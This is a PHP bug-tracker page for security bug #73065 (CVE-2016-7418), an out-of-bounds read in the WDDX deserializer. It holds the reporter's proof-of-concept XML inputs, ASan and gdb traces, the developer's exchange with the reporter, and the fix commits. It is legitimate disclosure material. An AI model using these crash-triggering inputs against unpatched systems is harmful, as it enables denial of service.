<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #73065 - RDF' href='rss/bug.php?id=73065'>
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #73065 - RSS 2.0' href='rss/bug.php?id=73065&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #73065 :: Out-Of-Bounds Read in php_wddx_push_element of wddx.c</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=73065">Sec Bug</a>&nbsp;#73065</th>
            <td id="summary" colspan="5">Out-Of-Bounds Read in php_wddx_push_element of wddx.c</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-09-12 02:30 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-09-16 13:41 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=WDDX+related">WDDX related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.25</td>
            <th class="details">OS:</th>
            <td>Ubuntu</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7418" target="_blank">2016-7418</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=73065&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=73065&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=73065&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1473647455">&nbsp;</a><strong>[2016-09-12 02:30 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
CREDIT
-----------------------
This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.


PHP VERSION
-----------------------
./sapi/cli/php --version
PHP 7.2.0-dev (cli) (built: Sep 11 2016 18:37:49) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies


PROOF-OF-CONCEPT FILE
-----------------------
Posted in the &quot;Test script&quot; section.


STACKTRACE
-----------------------
Posted in the &quot;Actual result&quot; section.


VULNERABILITY DETAILS
-----------------------
A DoS (null pointer dereference) vulnerability can be triggered in function wddx_deserialize. 
To reproduce this issue, please run export USE_ZEND_ALLOC=0 before executing the test script.

Test script:
---------------
&lt;?php
    $xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0' ?&gt;
    &lt;!DOCTYPE et SYSTEM 'w'&gt;
    &lt;wddxPacket ven='1.0'&gt;
        &lt;array&gt;
            &lt;var Name=&quot;name&quot;&gt;
                &lt;boolean value=&quot;keliu&quot;&gt;&lt;/boolean&gt;
            &lt;/var&gt;
            &lt;var name=&quot;1111&quot;&gt;
                &lt;var name=&quot;2222&quot;&gt;
                    &lt;var name=&quot;3333&quot;&gt;&lt;/var&gt;
                &lt;/var&gt;
            &lt;/var&gt;
        &lt;/array&gt;
    &lt;/wddxPacket&gt;
XML;
    
    $array = wddx_deserialize($xml);
    var_dump($array);
?&gt;

Expected result:
----------------
Exit quietly.

Actual result:
--------------
==47769==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 
    (pc 0x00000046fb9c bp 0x7ffc278e29b0 sp 0x7ffc278e2130 T0)
    #0 0x46fb9b in __interceptor_strcmp.part.24 (php-src/sapi/cli/php+0x46fb9b)
    #1 0xac41d4 in php_wddx_push_element php-src/ext/wddx/wddx.c:791:9
    #2 0x7fa8715ac67f in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x867f)
    #3 0x7fa8715ad38b in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x938b)
    #4 0x7fa8715aecad in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xacad)
    #5 0x7fa8715af404 in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xb404)
    #6 0x7fa8715b170a in XML_ParseBuffer (/lib/x86_64-linux-gnu/libexpat.so.1+0xd70a)
    #7 0xac1717 in php_wddx_deserialize_ex php-src/ext/wddx/wddx.c:1081:2
    #8 0xabad7a in zif_wddx_deserialize php-src/ext/wddx/wddx.c:1299:2
    #9 0xfdfb3d in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER php-src/Zend/zend_vm_execute.h:675:2
    #10 0xe75f4b in execute_ex php-src/Zend/zend_vm_execute.h:432:7
    #11 0xe76ec3 in zend_execute php-src/Zend/zend_vm_execute.h:474:2
    #12 0xd00e9e in zend_execute_scripts php-src/Zend/zend.c:1464:4
    #13 0xad4425 in php_execute_script php-src/main/main.c:2537:14
    #14 0x10fca26 in do_cli php-src/sapi/cli/php_cli.c:990:5
    #15 0x10f9f60 in main php-src/sapi/cli/php_cli.c:1378:18
    #16 0x7fa86fec582f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
    #17 0x449578 in _start (php-src/sapi/cli/php+0x449578)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (php-src/sapi/cli/php+0x46fb9b) in __interceptor_strcmp.part.24
==47769==ABORTING

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=73065'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=73065'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1473652652">&nbsp;</a><strong>[2016-09-12 03:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_comment' ><a name="1473652652">&nbsp;</a><strong>[2016-09-12 03:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Was not able to reproduce in previous versions, master is not a released version.
</pre>
</div><div class='comment type_log' ><a name="1473655875">&nbsp;</a><strong>[2016-09-12 04:51 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type:           Bug</span>
<span class="added">+Type:           Security</span>
<span class="removed">-PHP Version:    master-Git-2016-09-12 (snap)</span>
<span class="added">+PHP Version:    7.0.10</span>
<span class="removed">-Private report: No</span>
<span class="added">+Private report: Yes</span>
</div></div></div><div class='comment type_comment' ><a name="1473655875">&nbsp;</a><strong>[2016-09-12 04:51 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Hello, I can reproduce it with PHP 7.0.10. It's the current stable version according to <a href="http://php.net/downloads.php" rel="nofollow">http://php.net/downloads.php</a> .

worker@ubuntu:~/Desktop/repo/php-7.0.10$ ./sapi/cli/php wddx_null.php 
ASAN:DEADLYSIGNAL
=================================================================
==33608==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 
(pc 0x00000046ef7c bp 0x7ffcfff765b0 sp 0x7ffcfff75d30 T0)
    #0 0x46ef7b in __interceptor_strcmp.part.24 (php-7.0.10/sapi/cli/php+0x46ef7b)
    #1 0xaacea4 in php_wddx_push_element php-7.0.10/ext/wddx/wddx.c:791:9
    #2 0x7f866498d67f in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x867f)
    #3 0x7f866498e38b in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x938b)
    #4 0x7f866498fcad in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xacad)
    #5 0x7f8664990404 in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xb404)
    #6 0x7f866499270a in XML_ParseBuffer (/lib/x86_64-linux-gnu/libexpat.so.1+0xd70a)
    #7 0xaaa3e7 in php_wddx_deserialize_ex php-7.0.10/ext/wddx/wddx.c:1086:2
    #8 0xaa3a1a in zif_wddx_deserialize php-7.0.10/ext/wddx/wddx.c:1304:2
    #9 0xf9aab9 in ZEND_DO_ICALL_SPEC_HANDLER php-7.0.10/Zend/zend_vm_execute.h:586:2
    #10 0xe45c3b in execute_ex php-7.0.10/Zend/zend_vm_execute.h:417:7
    #11 0xe4691b in zend_execute php-7.0.10/Zend/zend_vm_execute.h:458:2
    #12 0xcdd86e in zend_execute_scripts php-7.0.10/Zend/zend.c:1427:4
    #13 0xabcf35 in php_execute_script php-7.0.10/main/main.c:2494:14
    #14 0x1045d46 in do_cli php-7.0.10/sapi/cli/php_cli.c:974:5
    #15 0x1043270 in main php-7.0.10/sapi/cli/php_cli.c:1344:18
    #16 0x7f86632a682f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
    #17 0x448958 in _start (php-7.0.10/sapi/cli/php+0x448958)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (php-7.0.10/sapi/cli/php+0x46ef7b) in __interceptor_strcmp.part.24
==33608==ABORTING
</pre>
</div><div class='comment type_comment' ><a name="1473657723">&nbsp;</a><strong>[2016-09-12 05:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The backtrace looks kind of strange too. It says the problem is in line 791 of wddx.c, which is:

			if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {

The problem is that the loop just above it is:

		if (atts) for (i = 0; atts[i]; i++) {

so if strcmp argument is 0, how did it enter the loop body? Something is wrong here.
</pre>
</div><div class='comment type_log' ><a name="1473658068">&nbsp;</a><strong>[2016-09-12 05:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Feedback</span>
</div></div></div><div class='comment type_comment' ><a name="1473658068">&nbsp;</a><strong>[2016-09-12 05:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I also manually run through the code with the debugger and was not able to reproduce any problem, or see any null value in php_wddx_push_element. I suspect it's either a bug in AddressSanitizer or something is very wrong with your build.
</pre>
</div><div class='comment type_log' ><a name="1473660954">&nbsp;</a><strong>[2016-09-12 06:15 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Feedback</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1473660954">&nbsp;</a><strong>[2016-09-12 06:15 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Hi, I debugged this issue and confirmed it exits. The information given by AddressSanitizer is wired. In fact it's not a NULL pointer dereference issue but an invalid pointer reference issue.


(gdb) r /path/to/poc/wddx_null.php 
Starting program: /home/worker/Desktop/repo/php-7.0.10/sapi/cli/php /path/to/poc/wddx_null.php

Breakpoint 1, php_wddx_push_element (user_data=0x7fffffffa160, name=0xcf9080 &quot;var&quot;, atts=0xcf6e30)
    at /home/worker/Desktop/repo/php-7.0.10/ext/wddx/wddx.c:791
791			if (atts) for (i = 0; atts[i]; i++) {
(gdb) n
792				if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
(gdb) p i
$12 = 0
(gdb) p atts[i]
$13 = (const XML_Char *) 0xcf8699 &quot;Name&quot;

--------------------------------------------------------------------------------------
i = 0
atts[i] = &quot;Name&quot; (0xcf8699)
EL_NAME = &quot;name&quot;
Here strcmp((char *)atts[i], EL_NAME) != 0 and the remained conditions will not be checked.
--------------------------------------------------------------------------------------



(gdb) n
791			if (atts) for (i = 0; atts[i]; i++) {
(gdb) p i
$15 = 0
(gdb) n
792				if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
(gdb) p i
$16 = 1
(gdb) p atts[i]
$17 = (const XML_Char *) 0xcf783c &quot;name&quot;

--------------------------------------------------------------------------------------
i = 1
atts[i] = &quot;name&quot; (0xcf783c)
EL_NAME = &quot;name&quot;
Here strcmp((char *)atts[i], EL_NAME) == 0 and the remained conditions will be checked.
So executing atts[++i].
Here i equals 2 now. 

(gdb) x/20xw atts
0xcf6e30:	0x00cf8699	0x00000000	0x00cf783c	0x00000000
0xcf6e40:	0x00000000	0x00000000	0x61507801	0x74656b63
0xcf6e50:	0x580a0d3e	0x0d3b4c4d	0x2020200a	0x200a0d20
0xcf6e60:	0x24202020	0x61727261	0x203d2079	0x78646477
0xcf6e70:	0x7365645f	0x61697265	0x657a696c	0x6d782428

However atts[2] == 0, so the remained condition will not be checked.
--------------------------------------------------------------------------------------



(gdb) n
791			if (atts) for (i = 0; atts[i]; i++) {
(gdb) p i
$18 = 2
(gdb) n
792				if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
(gdb) p i
$19 = 3
(gdb) p atts[i]
$21 = (const XML_Char *) 0x74656b6361507801 &lt;error: Cannot access memory at address 0x74656b6361507801&gt;
(gdb) x/40xw atts
(gdb) x/20xw atts
0xcf6e30:	0x00cf8699	0x00000000	0x00cf783c	0x00000000
0xcf6e40:	0x00000000	0x00000000	[0x61507801	0x74656b63]  --&gt; atts[3]
0xcf6e50:	0x580a0d3e	0x0d3b4c4d	0x2020200a	0x200a0d20
0xcf6e60:	0x24202020	0x61727261	0x203d2079	0x78646477
0xcf6e70:	0x7365645f	0x61697265	0x657a696c	0x6d782428

--------------------------------------------------------------------------------------
When executing the for-loop, firstly executing i++, then i equals 3.
Now atts[i] is not NULL! Only atts[2] is NULL but it's not checked in the for-loop.
Please notice that atts[2] was checked in the if statement!

Now atts[3] points to 0x74656b6361507801. When calling the strcmp function, the process
will receive signal SIGSEGV because the address cannot be read.
--------------------------------------------------------------------------------------



(gdb) n
Program received signal SIGSEGV, Segmentation fault.
__strcmp_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S:31
31	../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S: No such file or directory.

(gdb) x/i $rip
=&gt; 0x7ffff6da1b5a &lt;__strcmp_sse2_unaligned+26&gt;:	movdqu (%rdi),%xmm1

(gdb) i r $rdi
rdi            0x74656b6361507801	8387227955626014721

(gdb) x/20xb $rdi
0x74656b6361507801:	Cannot access memory at address 0x74656b6361507801

(gdb) bt
#0  __strcmp_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S:31
#1  0x000000000060ee81 in php_wddx_push_element (user_data=0x7fffffffa160, name=0xcf9080 &quot;var&quot;, atts=0xcf6e30)
    at /home/worker/Desktop/repo/php-7.0.10/ext/wddx/wddx.c:792
#2  0x00007ffff7bb6680 in ?? () from /lib/x86_64-linux-gnu/libexpat.so.1
#3  0x00007ffff7bb738c in ?? () from /lib/x86_64-linux-gnu/libexpat.so.1
#4  0x00007ffff7bb8cae in ?? () from /lib/x86_64-linux-gnu/libexpat.so.1
#5  0x00007ffff7bb9405 in ?? () from /lib/x86_64-linux-gnu/libexpat.so.1
#6  0x00007ffff7bbb70b in XML_ParseBuffer () from /lib/x86_64-linux-gnu/libexpat.so.1
#7  0x0000000000610c05 in php_wddx_deserialize_ex (
    value=0x7ffff4282018 &quot;&lt;?xml version='1.0' ?&gt;\r\n    &lt;!DOCTYPE et SYSTEM 'w'&gt;\r\n    &lt;wddxPacket ven='1.0'&gt;\r\n        &lt;array&gt;\r\n&quot;, ' ' &lt;repeats 12 times&gt;, &quot;&lt;var Name=\&quot;name\&quot;&gt;\r\n&quot;, ' ' &lt;repeats 16 times&gt;, &quot;&lt;boolean value=\&quot;keliu\&quot;&gt;&lt;/boolean&gt;\r\n&quot;, ' ' &lt;repeats 12 times&gt;, &quot;&lt;/var&gt;\r&quot;..., 
    vallen=391, return_value=0x7ffff42140c0) at /home/worker/Desktop/repo/php-7.0.10/ext/wddx/wddx.c:1087
#8  0x00000000006119f5 in zif_wddx_deserialize (execute_data=0x7ffff42140f0, return_value=0x7ffff42140c0)
    at /home/worker/Desktop/repo/php-7.0.10/ext/wddx/wddx.c:1305
#9  0x000000000074fb3b in ZEND_DO_ICALL_SPEC_HANDLER () at /home/worker/Desktop/repo/php-7.0.10/Zend/zend_vm_execute.h:586
#10 0x000000000074e3b8 in execute_ex (ex=0x7ffff4214030) at /home/worker/Desktop/repo/php-7.0.10/Zend/zend_vm_execute.h:414
#11 0x000000000074ecab in zend_execute (op_array=0x7ffff4283000, return_value=0x0) at /home/worker/Desktop/repo/php-7.0.10/Zend/zend_vm_execute.h:458
#12 0x00000000006be044 in zend_execute_scripts (type=8, retval=0x0, file_count=3) at /home/worker/Desktop/repo/php-7.0.10/Zend/zend.c:1427
#13 0x0000000000616881 in php_execute_script (primary_file=0x7fffffffcb50) at /home/worker/Desktop/repo/php-7.0.10/main/main.c:2494
#14 0x000000000082a37c in do_cli (argc=2, argv=0xc481a0) at /home/worker/Desktop/repo/php-7.0.10/sapi/cli/php_cli.c:974
#15 0x000000000082b625 in main (argc=2, argv=0xc481a0) at /home/worker/Desktop/repo/php-7.0.10/sapi/cli/php_cli.c:1344
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
</pre>
</div><div class='comment type_comment' ><a name="1473661260">&nbsp;</a><strong>[2016-09-12 06:21 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>&gt; [2016-09-12 05:22 UTC] stas@php.net
&gt; The backtrace looks kind of strange too. It says the problem is in line 791 of wddx.c, which is:
&gt; 			if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
&gt; The problem is that the loop just above it is:
&gt; 		if (atts) for (i = 0; atts[i]; i++) {
&gt; so if strcmp argument is 0, how did it enter the loop body? Something is wrong here.

Here is my answer.

790  if (atts) for (i = 0; atts[i]; i++) {
791      if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
792          if (stack-&gt;varname) efree(stack-&gt;varname);
793          stack-&gt;varname = estrdup((char *)atts[i]);
794          break;
795      }
796  }

atts[0] = 0x0000000000cf8699  &quot;Name&quot;
atts[1] = 0x0000000000cf783c  &quot;name&quot;   EL_NAME
atts[2] = 0x0000000000000000  NULL
atts[3] = 0x74656b6361507801  ????

atts[2] was not checked in the for-loop but in the if statement. So strcmp(atts[3], EL_NAME) would cause an Out-Of-Bounds read issue.
</pre>
</div><div class='comment type_log' ><a name="1473661620">&nbsp;</a><strong>[2016-09-12 06:27 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: NULL pointer dereference in wddx_deserialize of
          wddx.c</span>
<span class="added">+Summary: Out-Of-Bounds Read in php_wddx_push_element of wddx.c</span>
</div></div></div><div class='comment type_comment' ><a name="1473661620">&nbsp;</a><strong>[2016-09-12 06:27 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>OS: Ubuntu 16.04 LTS 64-bit.

(gdb) x/i $rip
=&gt; 0x7ffff6da1b5a &lt;__strcmp_sse2_unaligned+26&gt;:	movdqu (%rdi),%xmm1

(gdb) i r $rdi
rdi            0x74656b6361507801	8387227955626014721

&gt;&gt;&gt; '74656b6361507801'.decode('hex')[::-1]
'\x01xPacket'
</pre>
</div><div class='comment type_comment' ><a name="1473662656">&nbsp;</a><strong>[2016-09-12 06:44 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>There are other four similar issues in function php_wddx_push_element.

------------
1. Line 740
------------
&lt;?php
    $xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0' ?&gt;
    &lt;!DOCTYPE et SYSTEM 'w'&gt;
    &lt;wddxPacket ven='1.0'&gt;
        &lt;array&gt;
            &lt;char Name=&quot;code&quot;&gt;
                &lt;boolean value=&quot;keliu&quot;&gt;&lt;/boolean&gt;
            &lt;/char&gt;
        &lt;/array&gt;
    &lt;/wddxPacket&gt;
XML;
    
    $array = wddx_deserialize($xml);
    var_dump($array);
?&gt;


------------
2. Line 758
------------
&lt;?php
    $xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0' ?&gt;
    &lt;!DOCTYPE et SYSTEM 'w'&gt;
    &lt;wddxPacket ven='1.0'&gt;
        &lt;array&gt;
            &lt;boolean Name=&quot;value&quot;&gt;
                &lt;boolean value=&quot;keliu&quot;&gt;&lt;/boolean&gt;
            &lt;/boolean&gt;
        &lt;/array&gt;
    &lt;/wddxPacket&gt;
XML;
    
    $array = wddx_deserialize($xml);
    var_dump($array);
?&gt;


------------
3. Line 804
------------
&lt;?php
    $xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0' ?&gt;
    &lt;!DOCTYPE et SYSTEM 'w'&gt;
    &lt;wddxPacket ven='1.0'&gt;
        &lt;array&gt;
            &lt;recordset Name=&quot;fieldNames&quot;&gt;
                &lt;boolean value=&quot;keliu&quot;&gt;&lt;/boolean&gt;
            &lt;/recordset&gt;
        &lt;/array&gt;
    &lt;/wddxPacket&gt;
XML;
    
    $array = wddx_deserialize($xml);
    var_dump($array);
?&gt;


------------
4. Line 838
------------
&lt;?php
    $xml = &lt;&lt;&lt;XML
&lt;?xml version='1.0' ?&gt;
    &lt;!DOCTYPE et SYSTEM 'w'&gt;
    &lt;wddxPacket ven='1.0'&gt;
        &lt;array&gt;
            &lt;field Name=&quot;name&quot;&gt;
                &lt;boolean value=&quot;keliu&quot;&gt;&lt;/boolean&gt;
            &lt;/field&gt;
        &lt;/array&gt;
    &lt;/wddxPacket&gt;
XML;
    
    $array = wddx_deserialize($xml);
    var_dump($array);
?&gt;
</pre>
</div><div class='comment type_comment' ><a name="1473664871">&nbsp;</a><strong>[2016-09-12 07:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>OK, I see now what's going on here. AddressSanitizer message was misleading and my version of xmllib passes it with bunch of zeroes. Now I understand the issues, thanks.
</pre>
</div><div class='comment type_log' ><a name="1473665303">&nbsp;</a><strong>[2016-09-12 07:28 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.10</span>
<span class="added">+PHP Version: 5.6.25</span>
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID:      needed</span>
</div></div></div><div class='comment type_log' ><a name="1473665759">&nbsp;</a><strong>[2016-09-12 07:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1473665759">&nbsp;</a><strong>[2016-09-12 07:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix is in security repo as bbaf784f8d213e201baf67e861f20b38c6e87d3b and in <a href="https://gist.github.com/f0583c14f573737da81be2f6cef3b0fc" rel="nofollow">https://gist.github.com/f0583c14f573737da81be2f6cef3b0fc</a>
</pre>
</div><div class='comment type_comment' ><a name="1473665768">&nbsp;</a><strong>[2016-09-12 07:36 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>please verify
</pre>
</div><div class='comment type_comment' ><a name="1473669754">&nbsp;</a><strong>[2016-09-12 08:42 UTC] stackexploit &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>I've verified that the patch works fine. Thanks.
</pre>
</div><div class='comment type_svn' ><a name="1473739474">&nbsp;</a><strong>[2016-09-13 04:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_log' ><a name="1473739474">&nbsp;</a><strong>[2016-09-13 04:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1473739599">&nbsp;</a><strong>[2016-09-13 04:06 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_svn' ><a name="1473739782">&nbsp;</a><strong>[2016-09-13 04:09 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_svn' ><a name="1473739878">&nbsp;</a><strong>[2016-09-13 04:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9528ce73156e2b6a5e96e371068b24a5975f4bcd</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_svn' ><a name="1473757372">&nbsp;</a><strong>[2016-09-13 09:02 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_svn' ><a name="1473931842">&nbsp;</a><strong>[2016-09-15 09:30 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7d011b6f59a3f5a59a9835f9ad40d9b40c266bec" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7d011b6f59a3f5a59a9835f9ad40d9b40c266bec</a>
Log: Fix <a href='bug.php?id=73065'>bug #73065</a>: Out-Of-Bounds Read in php_wddx_push_element of wddx.c
</pre>
</div><div class='comment type_log' ><a name="1474033296">&nbsp;</a><strong>[2016-09-16 13:41 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
